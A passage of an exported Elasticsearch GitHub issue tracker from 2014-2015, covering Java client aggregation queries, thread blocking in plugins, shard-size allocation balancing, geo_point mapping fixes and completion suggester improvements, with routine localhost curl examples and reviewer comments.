&#160;&#160;&#160;&#160;&#160; "max_score" : 0,
&#160;&#160;&#160;&#160;&#160; "hits" : [
&#160;&#160;&#160;&#160;&#160; ]
&#160;&#160; },
&#160;&#160; "aggregations" : {
&#160;&#160;&#160;&#160;&#160; "articles_over_time" : {
&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; "buckets" : [
&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ]
&#160;&#160;&#160;&#160;&#160; }
&#160;&#160; }
}

&#160;

I am misunderstanding the api? But in java api an index (and type) is supplied ...

&#160;

regards,

markus

&#160;
&#160;

&#160;

&#160;

Gesendet:&#160;Mittwoch, 06. August 2014 um 23:57 UhrVon:&#160;"David Pilato" notifications@github.comAn:&#160;elasticsearch/elasticsearch elasticsearch@noreply.github.comCc:&#160;skippi1 skippi1@gmx.deBetreff:&#160;Re: [elasticsearch] ES java client issues (#7179)

If I understand you correctly, you run two queries using Java which don't work as expected, but running the following works fine:

curl -XPOST http://localhost:9200/_search -d '{
    "aggs": {
        "articles_over_time": {
            "date_histogram": {
                "field": "@timestamp",
                "interval": "1d"
            }
        }
    },
    "size": 0
}'

Is my understanding correct?

&#8212;
Reply to this email directly or view it on GitHub.
</comment><comment author="clintongormley" created="2014-08-07T12:39:15Z" id="51465661">@skippi1 your REST request without index/type searches across all indices and all types.  Those documents are coming from a different index (or type).
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Long-running operations cause some requests to hang</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7178</link><project id="" key="" /><description>We recently responded to a number of application failures which we traced back to client code timing out while waiting for a response from Elasticsearch.  We quickly saw that these timeouts coincided with an in-house plugin that was performing a long-running operation.  Currently, the plugin blocks until the operation completes.  This can take anywhere from seconds to an hour, depending on how many docs need to be updated.

With a long-running task in the background, we observed that some requests would complete instantly, while others would seem to get stuck behind the long running operation.  We saw the same behavior with multiple types of requests, including the root route (&#8220;You know, for search&#8221;).  If we let the subsequent &#8216;stuck&#8217; requests wait, we&#8217;d see them return the correct response after the long-running operation completed.

We created a dummy plugin to simulate work via sleeping the thread.  The conditions were  definitely repeatable, but not necessarily deterministic.  It didn&#8217;t take a lot of requests to make other requests stick, but we could up the probability by scheduling several concurrent dummy jobs.  We also modified the dummy plugin return a Success response _before_ starting the simulated work, and still got stuck requests.

Our production cluster is still running 0.90, but we were able to replicate on a test setup of 0.90 and 1.2.3.

(This is where I get hand-wavy, sorry if I&#8217;m abusing terms)

The behavior seems to imply that some requests are being assigned to threads that are already working on a long-running job, even though other threads in the pool might be idle.  After some digging, we came across the `es.http.blocking_server=true` setting, which seems to have stopped operations from getting stuck.  I understand that this swaps out Java blocking IO for the ES default non-blocking style, but wonder if this could cause undesired effects down the road.

So, I&#8217;m not sure if this is considered an issue or not, but I wanted to document the behavior and our current workaround of disabling non-blocking I/O for HTTP requests.  I&#8217;m wondering:
- Is our assumption that subsequent requests are being assigned to busy threads accurate?  If so, is this desired/known behavior?
- Are there any &#8220;show-stopper&#8221; downstream consequences of enabling `blocking_server`?  Is there a better setting to use?
- Is there a better pattern for performing long running updates in a plugin that would release the thread to perform other requests or indicate that it is busy and cannot take additional requests?  A helpful person in IRC suggested that trying to emulate the way Snapshots work, but based on our testing, even returning immediately before sleeping in a plugin appears to reproduce.

If it&#8217;s helpful, I can reply on this thread with code for our dummy plugin and some more detailed repro steps.

Thanks!
</description><key id="39652794">7178</key><summary>Long-running operations cause some requests to hang</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">adamjreilly</reporter><labels /><created>2014-08-06T18:49:18Z</created><updated>2014-08-06T20:51:39Z</updated><resolved>2014-08-06T20:51:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-06T20:51:37Z" id="51395335">This issues list is for bug reports and feature requests. Please ask questions like these in the mailing list instead. BTW, if you take a look at any REST code in elasticsearch it never does anything long on the thread that processes the request. All long running processing is always done on a separate thread from an operation-specific thread pool. You should follow the same pattern.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add executable flag to every file in bin/ after install</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7177</link><project id="" key="" /><description>The PluginManager does not preserve permissions on install due to using platform independent `ZipEntry` class. This patch sets the executable flag on every file in bin/ on plugin install as one is supposed to install executables in there.
</description><key id="39638796">7177</key><summary>Add executable flag to every file in bin/ after install</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>:Plugins</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-06T16:19:32Z</created><updated>2015-06-07T12:28:37Z</updated><resolved>2014-08-14T09:14:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-06T16:22:47Z" id="51359408">I guess this should work on windows as well, right?
LGTM.
</comment><comment author="spinscale" created="2014-08-06T16:24:27Z" id="51359659">@dadoonet can you run the branch and its tests on windows?
</comment><comment author="dadoonet" created="2014-08-06T16:25:29Z" id="51359800">@spinscale Will try tonight probably.
</comment><comment author="spinscale" created="2014-08-11T14:29:41Z" id="51787335">tested on one windows system, where the `PluginManagertests` passed
</comment><comment author="javanna" created="2014-08-14T07:56:26Z" id="52153974">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Percentile and percentile ranks for results of single value aggregations, e.g. sum</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7176</link><project id="" key="" /><description>I have seen a few people looking for this feature but I have not seen an issue or feature request for it.

I index documents, each of which has a numerical value and a user ID. I would like to aggregate by user ID (terms), then sum the numerical values for that user's documents. I would like to know the percentile rank of the sum for each of the users so that I can group users according to their performance.

It would be really powerful if percentile and percentile_rank aggregations could somehow operate on the single value results of nested aggregations.

How hard is this to implement? Is such a feature planned?
</description><key id="39628672">7176</key><summary>Percentile and percentile ranks for results of single value aggregations, e.g. sum</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jbrook</reporter><labels><label>discuss</label><label>feature</label></labels><created>2014-08-06T14:51:26Z</created><updated>2014-10-31T10:37:29Z</updated><resolved>2014-10-31T10:37:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-07T08:18:00Z" id="51443492">Indeed aggregations cannot work on the result of other aggregations. The only exception would be sorting on the terms and histogram aggs. We are considering this kind of feature, although we have no idea yet what it could look like in terms of API (ideally, we would like to be able to apply a wide range of operations, not only percentiles buckets, but also things like derivatives, clustering, etc.).
</comment><comment author="clintongormley" created="2014-10-31T10:37:29Z" id="61243363">Closing in favour of #8110 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix dynamic mapping of geo_point fields</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7175</link><project id="" key="" /><description>If a dynamic mapping for a geo_point field is defined and the first document specifies the value of the field as a geo_point array, the dynamic mapping throws an error as the array is broken into individual number before consulting the dynamic mapping configuration.  This change adds a check of the dynamic mapping before the array is split into individual numbers.

Closes #6939
</description><key id="39617076">7175</key><summary>Fix dynamic mapping of geo_point fields</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Mapping</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-06T12:44:03Z</created><updated>2015-06-07T19:11:41Z</updated><resolved>2014-08-11T12:09:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-08-06T12:44:57Z" id="51329043">There is possibly a neater way of doing this so any suggestions on a more efficient/elegant method would be good
</comment><comment author="jpountz" created="2014-08-11T07:59:44Z" id="51751431">This looks correct, but I'm wondering if more withinNewMapper/traverse/etc. logic could be shared with `parseDynamicValue`?
</comment><comment author="colings86" created="2014-08-11T12:04:43Z" id="51771501">I couldn't see how we could share code with `parseDynamicValue` but I did share some code with `serializeObject`
</comment><comment author="jpountz" created="2014-08-11T12:05:54Z" id="51771589">LGTM!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add slop param to completion suggester</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7174</link><project id="" key="" /><description>I would be very useful if completion suggester will accept a `slop` param. It will solve problem of suggesting for "aaaa bbbb" text in docs with `[ "bbbb aaaa", "bbbb", "aaaa" ]` input.
</description><key id="39616297">7174</key><summary>Add slop param to completion suggester</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">lazutkin</reporter><labels /><created>2014-08-06T12:32:20Z</created><updated>2015-11-21T16:42:59Z</updated><resolved>2015-11-21T16:42:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2015-11-21T16:42:59Z" id="158661253">Unfortunately, given the way that the completion suggester works (it just follows the common prefix) this wouldn't be possible.  This job should be done by search instead
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Added missing percolate API parameters to the rest spec</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7173</link><project id="" key="" /><description>(percolate_routing, percolate_preference) to the REST API Spec

https://github.com/elasticsearch/elasticsearch/issues/3380
http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-percolate.html#_percolating_an_existing_document
</description><key id="39604328">7173</key><summary>Added missing percolate API parameters to the rest spec</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/Mpdreamz/following{/other_user}', u'events_url': u'https://api.github.com/users/Mpdreamz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/Mpdreamz/orgs', u'url': u'https://api.github.com/users/Mpdreamz', u'gists_url': u'https://api.github.com/users/Mpdreamz/gists{/gist_id}', u'html_url': u'https://github.com/Mpdreamz', u'subscriptions_url': u'https://api.github.com/users/Mpdreamz/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/245275?v=4', u'repos_url': u'https://api.github.com/users/Mpdreamz/repos', u'received_events_url': u'https://api.github.com/users/Mpdreamz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/Mpdreamz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'Mpdreamz', u'type': u'User', u'id': 245275, u'followers_url': u'https://api.github.com/users/Mpdreamz/followers'}</assignee><reporter username="">Mpdreamz</reporter><labels><label>:REST</label><label>enhancement</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-08-06T09:32:30Z</created><updated>2015-06-07T17:01:36Z</updated><resolved>2014-10-28T18:37:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-06T13:18:44Z" id="51332531">LGTM
</comment><comment author="clintongormley" created="2014-08-07T19:19:05Z" id="51518699">@Mpdreamz want to get this merged in?
</comment><comment author="Mpdreamz" created="2014-10-06T21:17:15Z" id="58100651">@clintongormley yes I do, is this pending on me merging it in `master` ?
</comment><comment author="clintongormley" created="2014-10-15T15:18:35Z" id="59222664">@Mpdreamz I'd merge it into master and 1.x
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fixing typo in the first JSON example</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7172</link><project id="" key="" /><description /><key id="39598363">7172</key><summary>Fixing typo in the first JSON example</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">eliasah</reporter><labels /><created>2014-08-06T08:06:34Z</created><updated>2014-08-07T12:06:45Z</updated><resolved>2014-08-07T12:06:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-07T12:06:31Z" id="51462777">thanks @eliasah 

merged
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add shard size allocation balance function</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7171</link><project id="" key="" /><description>From the docs:
`cluster.routing.allocation.balance.size`::
     Defines a weight factor for the number of similarly sized shards allocated
      on a node (float). Defaults to `0.00f` because it is new and we're not
      yet sure what a good default is.  Raising this raises the tendency to
      equalize the number of similarly sized shards across all nodes in the
      cluster.  "Similarly sized" means that this formula spits out the same
      number:
        size &lt;= 10^7^ bytes ? 0 : floor(log10(size))
      So 1GB and 5GB shards are "similar" and so are 1KB and 40MB.

Side effects:
1.  Enables cluster info collection on all master eligible nodes so that
they can make informed decisions based on shard sizes as soon as they get
elected master.  They don't have to wait for the job to return when they
are elected.
2.  Removes the disabled flag for the cluster info job.  Its now complicate
to know when you can disable it.  Besides, the disk allocation decider is
on by default now and that needs it too.
3.  Reworks BalanceConfigurationTests quite a bit adding a test for the
shard size balance and a test that random balance settings actually converge.
4.  Fixes some of the cluster rebalance docs that were confusing on reread.

Closes #7155
</description><key id="39589512">7171</key><summary>Add shard size allocation balance function</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">nik9000</reporter><labels><label>:Allocation</label><label>discuss</label><label>review</label></labels><created>2014-08-06T04:50:44Z</created><updated>2015-09-01T18:51:35Z</updated><resolved>2015-09-01T18:51:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-08-06T04:52:09Z" id="51293680">I'm not super familiar with this part of the code so please review carefully!  Also, some jet lag was involved in the creation of this pull request.....  Its 5:51am where I am right now so please review double carefully!
</comment><comment author="nik9000" created="2014-08-06T09:10:50Z" id="51310670">One thing I still need to think about for this: what does the cluster do when it doesn't yet have shard sizes?  Right now I believe this decider always returns 0.  Which might cause the cluster to want to move shards around on startup which is lame.
</comment><comment author="nik9000" created="2014-08-06T16:12:04Z" id="51357977">I've pushed another commit that addresses all the issues except that I enable the cluster info job on every master eligible node.  I'm thinking I should revert that  and instead cause the balancer to abort if there isn't shard size information if the shard size allocator is used.  The problem is that balancing without the shard size information when the shard size balancing is disabled is going to cause thrash.
</comment><comment author="nik9000" created="2014-08-07T11:39:43Z" id="51460701">I pushed another commit that allows you to specify an override shard size that only applies for a short period of time.  It can be used to help prevent jumping around when you quickly rebuild an index like during a no downtime reindex.

I think I've accumulated a few things taht I don't have good tests for.  Can you suggest any places to add tests?
</comment><comment author="nik9000" created="2014-08-07T18:52:28Z" id="51515291">Added more code - really would like a hint on a good way to test it though :)
</comment><comment author="nik9000" created="2014-08-07T19:21:36Z" id="51519013">Ooops!  Ignore that for a bit.  I've broken it.
</comment><comment author="nik9000" created="2014-08-07T19:57:16Z" id="51523298">There we go - less broken.
</comment><comment author="nik9000" created="2014-08-14T13:09:49Z" id="52180617">OK - back from travel and can give this real attention.  I'd love some advice on better ways to test this.  I'm going to brainstorm about that for a bit and see if I can come up with something.  The balance function's dynamics are pretty well tested so far but things like shutting off rebalancing if shard sizes are needed and not available and the actual calculation of the averages isn't tested yet.
</comment><comment author="nik9000" created="2014-08-14T18:25:24Z" id="52222279">Pushed a test for most of the rest of the changes but its a bit [navel-gaze-y](https://en.wiktionary.org/wiki/navel-gazing) due to mocks.  It does verify the behavior I want though - the averages are right and only the master node pulls the disk data.

I don't have something for skipping the rebalancing when the shard sizes aren't available, but I feel less bad about it now.  I'll have a look at adding something for it soon though.

I think I'm ready for more review at this point.
</comment><comment author="dakrone" created="2014-08-15T15:11:22Z" id="52316735">@nik9000 I'm going to run this through some local testing on a big machine, just to let you know I haven't forgotten it
</comment><comment author="nik9000" created="2014-08-15T15:16:08Z" id="52317335">@dakrone Thanks!  I'm mostly finished with your comments and can push that in a minute.  I'm still wondering what if anything we should do if the user doesn't configure the `index.minimum_shard_size` on a new index.  Using `0` seems like the least surprising thing to do.
</comment><comment author="nik9000" created="2014-08-15T18:15:03Z" id="52339788">And now it looks like my refactoring broke a test.  Sadness.....
</comment><comment author="nik9000" created="2014-08-25T13:43:36Z" id="53264881">Hey!  I figure its worth poking this to see about the status.  I'll give it another review of my own later today if possible.
</comment><comment author="nik9000" created="2014-08-27T16:11:58Z" id="53598280">Just performed a self review after two weeks of not really looking at it.  I'll push some small updates once they pass tests locally.  I really should buy a desktop with more cores to speed up these tests at some point.....
</comment><comment author="dakrone" created="2014-08-28T09:15:28Z" id="53692238">@nik9000 I'm playing with this some more, but getting unexpected results, I'm starting 4 ES nodes with these settings:

```
cluster.routing.allocation.balance.index: 0.0
cluster.routing.allocation.balance.shard: 0.0
cluster.routing.allocation.balance.primary: 0.0
cluster.routing.allocation.balance.shard_size: 1.0
```

And I created some shards of differing sizes:

```
~ &#955;| shards
index     shard prirep state      docs   store ip             node          
tmdb      2     p      STARTED   29169 115.7mb 192.168.192.50 Lady Mandarin 
tmdb      0     p      STARTED   29240 119.1mb 192.168.192.50 Infinity      
tmdb      3     p      STARTED   29068 119.7mb 192.168.192.50 Lady Mandarin 
tmdb      1     p      STARTED   29075 117.2mb 192.168.192.50 Growing Man   
tmdb      4     p      STARTED   29253 119.6mb 192.168.192.50 Lady Mandarin 
mirflickr 2     p      STARTED    5000  12.3mb 192.168.192.50 Growing Man   
mirflickr 0     p      STARTED    5000  13.3mb 192.168.192.50 Infinity      
mirflickr 3     p      STARTED    5000  13.1mb 192.168.192.50 Lady Mandarin 
mirflickr 1     p      STARTED    4999  12.9mb 192.168.192.50 Manta         
mirflickr 4     p      STARTED    5001  12.5mb 192.168.192.50 Lady Mandarin 
movielens 2     p      STARTED    2071   3.4mb 192.168.192.50 Lady Mandarin 
movielens 0     p      STARTED    2066   3.3mb 192.168.192.50 Manta         
movielens 3     p      STARTED    2015   3.3mb 192.168.192.50 Lady Mandarin 
movielens 1     p      STARTED    2027   3.4mb 192.168.192.50 Infinity      
movielens 4     p      STARTED    2018   3.3mb 192.168.192.50 Growing Man   
imdb      4     p      STARTED  112270 114.8mb 192.168.192.50 Manta         
imdb      0     p      STARTED  112215 115.2mb 192.168.192.50 Manta         
imdb      3     p      STARTED  112378 114.9mb 192.168.192.50 Infinity      
imdb      1     p      STARTED  112411 105.1mb 192.168.192.50 Growing Man   
imdb      2     p      STARTED  112606 115.1mb 192.168.192.50 Manta         
wiki      0     p      STARTED 4834608   8.5gb 192.168.192.50 Growing Man   
wiki      1     p      STARTED 4833467   8.6gb 192.168.192.50 Infinity      

```

However, I'm getting allocation that looks like:

```
~ &#955;| get localhost:9200/_cat/allocation?v
shards disk.used disk.avail disk.total disk.percent host        ip             node
     5    34.7gb    205.3gb      240gb           14 delta-linux 192.168.192.50 Manta
     7    34.7gb    205.3gb      240gb           14 delta-linux 192.168.192.50 Lady Mandarin
     5    34.7gb    205.3gb      240gb           14 delta-linux 192.168.192.50 Growing Man
     5    34.7gb    205.3gb      240gb           14 delta-linux 192.168.192.50 Infinity
```

I was expecting the two ~8.5gb shards to be on their own nodes and have the rest of the shards distributed amongst the other nodes (creating quite a high imbalance due to my setting all the other weights to 0), however, it looks like they're still being balanced pretty evenly according to number. Any idea what I'm missing about this?
</comment><comment author="nik9000" created="2014-08-28T13:16:03Z" id="53717472">That behavior is pretty much what I expect - similarly sized shards are pushed apart.  The point is that if you have a bunch of those big shards but in different indexes then they are well spread out.  Just as important (for me, at least) - if you have a ton of small indexes they are evenly spread out as well.

I suppose the way to test this with you machine is to create another copy of the wiki index and verify that you end up with one on each node.
</comment><comment author="nik9000" created="2014-09-02T19:16:27Z" id="54202984">Would it help if I also added a total on disk size balance function?  I'm not sure it'd be more useful then this function but I'm happy to add it if it'll help the review process.
</comment><comment author="dakrone" created="2014-09-03T08:05:40Z" id="54264132">Okay, thanks for the explanation @nik9000, @s1monw maybe you can take a look at this also?
</comment><comment author="nik9000" created="2014-09-15T15:47:26Z" id="55610167">I imagine its too late in 1.4's release cycle to merge something of this size - should I change the `coming[1.4.0]` to `coming[1.5.0]`?
</comment><comment author="clintongormley" created="2014-09-24T18:47:10Z" id="56719156">@nik9000 yes please
</comment><comment author="nik9000" created="2014-09-30T18:01:16Z" id="57355548">Ping for @dakrone and @s1monw to have another look.  We're still seeing super unbalanced (disk wise) allocations on our cluster and think this'd help.   index.routing.allocation.total_shards_per_node is keeping us afloat but this would really help.
</comment><comment author="s1monw" created="2015-03-20T23:15:01Z" id="84185920">@nik9000 I love the functionality that this PR adds but I am at the same time pretty scared of it. I spoke to you in person about his briefly to tell you how I feel about it. Yet, I still think making decisions based on disk usage is pretty dangerous and only works if you can somehow predict the ingest rate somehow. For instance if we start making decision on how big the shard is we will almost certainly run into the point where shards get rebalanced out of a sudden and those situations are hard to explain. That said, I really try to keep the balance function pretty static ie. use factors that change rarely like number of shards or replicas. On the other hand it would be very useful to have some usage factors taken into account for this to ensure we don't place high indexing load shard and high search load shards on the same node (which can be an allocation decider already today). 

I wonder if we can take a baby step into this direction that allows you to configure indices in a way that ensures we take it's usage pattern into account when allocating shards. What do you think about the idea to start with a very simple `enum IndexWeight { LOW, MEDIUM, HIGH; }` (we can still extend to  `enum IndexWeight { LOW, MEDIUM, HIGH, MASSIVE, CRAZY, RIDICULOUS; }` later :) or just go with a weight in `[0..1]` ) I think this would be way easier to test and implement and IMO it would take us pretty far. It also has the advantage that we know that ahead of time and therefor can place the shards accordingly on index creation. What do you think! Sorry for taking so long to look at this.
</comment><comment author="s1monw" created="2015-03-31T20:57:24Z" id="88242451">@nik9000 ping
</comment><comment author="nik9000" created="2015-05-15T19:50:39Z" id="102508140">Hey - sorry I seem to be filtering my from github to aggressively.....

Yeah - I don't mind going with something more static and user configured if it gets us to a point where we can merge something. We suffer from this a lot less than we'd used to because we have tons more power now. But it still comes up from time to time.

Maybe its a simple as

```
curl -XPUT localhost:9200/test/_settings -d '{
    "index.routing.allocation.push_apart.tag" : "big"
}'
```

and the balancing algorithm tries to push all indexes that are "big" apart from each other. Its less magical and surprising then what I proposed. And it'd be reasonably simple to rig up something quick in python/perl/your favorite cron job language that implements the "log of index size" thing that I have in this pull request.

You could still tune the weight of the push_apart-ness with one of those balance weights.
</comment><comment author="nik9000" created="2015-05-15T20:01:58Z" id="102510002">I do wonder if it'd be worth implementing a job that you could turn on and off that sets the index size every half hour or something. I suspect it'd be used even if it were off by default. An not super hard to put together. That you could implement as a plugin though.

One way to make size based decisions less scary would be if they were sticky. Meh - better to let that be plugin or otherwise external code.
</comment><comment author="sawyercade" created="2015-07-31T16:15:46Z" id="126737722">For anyone still interested in balancing by shard size, we've created a plugin to do so that replaces ES's default BalancedShardsAllocator. [Here's the repo](/datarank/tempest), and [here is a blog post](http://engineering.datarank.com/2015/07/08/balancing-elasticsearch-cluster-by-shard-size.html) explaining how it works and demonstrating significant improvements in balance and heap usage across our 17-node cluster.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Completion &amp; Context Suggester: Support near real-time deleted document filtering for suggestions</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7170</link><project id="" key="" /><description>Idea:
- encode lucene docids to corresponding FST outputs
- make sure no surface form is lost even though there may be exact duplicates
- use encoded docids to perform real-time deleted doc filtering

Implementation &amp; Considerations:
- Currently the FST BytesRef Output is in the format:
   `surface_form` + `PAYLOAD_SEP` + `payload` + `PAYLOAD_SEP` + `docID`
- Duplicate surface forms are stored uniquely with dedup bytes. (uses the `END_BYTE` before the dedup bytes, maybe we can support `exact_first` in the future)
- `maxAnalyzedPathsForOneInput` is now dynamically set by taking into account the # of surfaces per analyzed form (to deepen the `TopNSearcher` queue)
- This implementation modifies the `XAnalyzingSuggester` further, I think it is a good idea to make lucene's `AnalyzingSuggester` more pluggable instead in the future.
- Minor refactoring

closes #7133
</description><key id="39585056">7170</key><summary>Completion &amp; Context Suggester: Support near real-time deleted document filtering for suggestions</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">areek</reporter><labels /><created>2014-08-06T02:46:18Z</created><updated>2014-08-20T15:43:25Z</updated><resolved>2014-08-20T15:43:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="areek" created="2014-08-07T02:25:20Z" id="51423422">Updated PR:
- use `vint` instead of `int` to encode/decode docIDs in FST output (see benchmark results in #7133)
- incorporated feedback

TODO:
- address `TopNSearcher` admissibility issue
</comment><comment author="areek" created="2014-08-08T03:07:07Z" id="51558572">Updated PR:

@mikemccand 
I have added a heuristics to minimize the probability of over-pruning in the `TopNSearcher`. (https://github.com/areek/elasticsearch/commit/7b87ff8ebebce3b85aaa91f9a80919978bd221d0#diff-d34ccf499ac27ebda3deaf9dfce11c7fR855). I am still running tests with a lot of unique terms to figure out the best numbers, but in the meantime would love a review of it. 
</comment><comment author="areek" created="2014-08-11T14:30:00Z" id="51787383">Updated PR: make TopNSearcher queue pruning heuristic more effecient
</comment><comment author="mikemccand" created="2014-08-11T14:36:01Z" id="51788242">I added one small comment, else LGTM!
</comment><comment author="areek" created="2014-08-11T15:22:58Z" id="51795072">Updated PR: incorporate feedback. Thanks @mikemccand for the review. I will commit this in a couple of hours, if there is no objection.
</comment><comment author="rmuir" created="2014-08-13T13:57:56Z" id="52051149">&gt; Duplicate surface forms are stored uniquely with dedup bytes. (uses the END_BYTE before the dedup bytes, maybe we can support exact_first in the future)

What happens if the users data exceeds maxSurfaceFormsPerAnalyzedForm because many documents have the same value? if we are only storing the 256th' highest i think thats ok, because it will "generally work" as long as we always recompute it on merge. But we definitely dont want to have an exception on merge if this happens... is this case tested?
</comment><comment author="areek" created="2014-08-13T14:46:31Z" id="52058240">Currently only the first 256 are stored. There is a check to make sure to do no-op otherwise (https://github.com/elasticsearch/elasticsearch/pull/7170/files#diff-d34ccf499ac27ebda3deaf9dfce11c7fR1058). Maybe it would be more correct to store the highest 256 rather then the first. Thoughts?
</comment><comment author="areek" created="2014-08-13T18:16:42Z" id="52088123">Updated PR: now top 256 dup surface forms are stored rather than the first 256. added test for this case. @rmuir a review would be awesome.
